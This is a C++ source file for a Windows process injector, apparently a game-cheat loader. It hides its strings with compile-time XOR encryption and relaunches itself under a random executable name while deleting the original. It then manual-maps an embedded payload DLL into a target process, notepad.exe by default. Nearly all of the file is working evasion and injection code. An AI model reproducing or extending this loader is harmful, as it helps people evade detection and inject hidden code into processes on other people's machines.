#include "injection.h"
#include "payload_dll.h"
#include <windows.h>
#include <string>
#include <random>
#include <iostream>

// ---------- Compile-time XOR string obfuscation (key auto from __LINE__) ----------
template<size_t N>
struct XorStr {
    char data[N];
    unsigned char key;
    constexpr XorStr(const char(&s)[N], unsigned char k) : data{}, key(k) {
        for (size_t i = 0; i < N; i++)
            data[i] = static_cast<char>(s[i] ^ k);
    }
    std::string decrypt() const {
        std::string r;
        r.reserve(N - 1);
        for (size_t i = 0; i < N - 1; i++)
            r += static_cast<char>(data[i] ^ key);
        return r;
    }
};

#define XOR_KEY ((__LINE__ * 31 + 17) % 256)
#define XOR_STR(s) ([]() -> const std::string& { \
    constexpr XorStr<sizeof(s)> _xor_impl(s, XOR_KEY); \
    static std::string _xor_dec; \
    static bool _xor_ok = ((_xor_dec = _xor_impl.decrypt()), true); \
    (void)_xor_ok; \
    return _xor_dec; \
})()

// ---------- Original logic below ----------

std::string RandomString(int len)
{
    static std::string chars = XOR_STR("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, static_cast<int>(chars.size()) - 1);

    std::string s;
    for (int i = 0; i < len; i++)
        s += chars[dis(gen)];

    return s;
}

std::string GetCurrentPath()
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return path;
}

std::string GetCurrentDirectoryFromExe()
{
    std::string full = GetCurrentPath();
    size_t pos = full.find_last_of(XOR_STR("\\/"));
    return full.substr(0, pos + 1);
}

void SpawnRandomCopy(int argc, char* argv[])
{
    std::string currentPath = GetCurrentPath();

    if (argc > 1 && std::string(argv[1]) == XOR_STR("--child"))
    {
        if (argc > 2)
        {
            Sleep(500);
            DeleteFileA(argv[2]);
        }
        return;
    }

    std::string dir = GetCurrentDirectoryFromExe();

    std::string newExe = dir + RandomString(8) + XOR_STR(".exe");

    if (!CopyFileA(currentPath.c_str(), newExe.c_str(), FALSE))
        return;

    std::string cmd =
        "\"" + newExe + "\" " + XOR_STR("--child") + " \"" + currentPath + "\"";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessA(
        NULL,
        (LPSTR)cmd.c_str(),
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        ExitProcess(0);
    }
}


const char* ProcName = XOR_STR("notepad.exe").c_str();

int main(int argc, char* argv[]) {

    SpawnRandomCopy(argc, argv);

    SetConsoleTitleA(RandomString(12).c_str());

    std::cout << XOR_STR("--Gaming is not everything in life.--\n");

	for (int i = 0; i < argc - 1; i++) {
		if (!strcmp(argv[i], "-proc")) {
			ProcName = argv[i + 1];
			continue;
		}
	}

	HANDLE hProc = OpenProc(ProcName);
	if (!hProc)
		return 0;

    std::cout << XOR_STR("[+] %s Handle: %p\n"), ProcName, hProc;

	if (!ManualMap(hProc, g_embedded_payload_dll, g_embedded_payload_dll_size)) {
        std::cout << XOR_STR("[-] Injection error\n");
		CloseHandle(hProc);
		return 0;
	}

	CloseHandle(hProc);

    std::cout << XOR_STR("[+] Injected!\n");

	//return 0;
    while (true)
        Sleep(1000);
}
